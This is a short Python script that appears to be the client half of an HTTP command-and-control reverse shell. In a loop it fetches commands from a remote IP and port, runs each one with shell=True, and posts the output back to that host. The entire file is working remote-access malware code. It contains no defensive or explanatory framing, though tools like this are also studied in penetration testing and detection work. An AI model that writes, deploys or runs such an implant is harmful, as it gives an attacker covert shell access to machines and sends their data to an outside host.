#!/usr/bin/python

from lib.banner import *
from lib.functions import *
import argparse
import requests
import subprocess
import time

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="The IP address to connect to.")
parser.add_argument("port", help="The TCP port to connect on.")
parser.add_argument("-v", "--verbose", help="Increase verbosity of output.", action="store_true")
args = parser.parse_args()


#
#
#
def hook():
	while True:
		if args.port == "80":
			req = requests.get('http://' + args.ip)
		else:
			req = requests.get('http://' + args.ip + ':' + args.port)

		cmd = req.text
		if args.verbose:
			print_info("cmd:\n" + cmd + "\n")

		if "!quit" in cmd:
			break

		else:
			CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdoutRead = CMD.stdout.read()
			stderrRead = CMD.stderr.read()
			if (stdoutRead == '' and stderrRead == ''):
				# Commands which return no output, such as rm.
				if args.port == "80":
					post_response = requests.post(url='http://' + args.ip, data='!NULL_OUTPUT')
					post_response = requests.post(url='http://' + args.ip, data='!NULL_OUTPUT')
				else:
					post_response = requests.post(url='http://' + args.ip + ':' + args.port, data='!NULL_OUTPUT')
					post_response = requests.post(url='http://' + args.ip + ':' + args.port, data='!NULL_OUTPUT')
			else:
				# Commands which return output, such as ls.
				if args.verbose:
					print_info("stdout:\n" + stdoutRead + "\n")
					print_info("stderrRead:\n" + stderrRead + "\n")

				if args.port == "80":
					post_response = requests.post(url='http://' + args.ip, data=stdoutRead)
					post_response = requests.post(url='http://' + args.ip, data=stderrRead)
				else:
					post_response = requests.post(url='http://' + args.ip + ':' + args.port, data=stdoutRead)
					post_response = requests.post(url='http://' + args.ip + ':' + args.port, data=stderrRead)

		time.sleep(5)


#
#
#
def main():
	if args.verbose:
		print(httpclibanner)

	hook()


#
#
#
main()
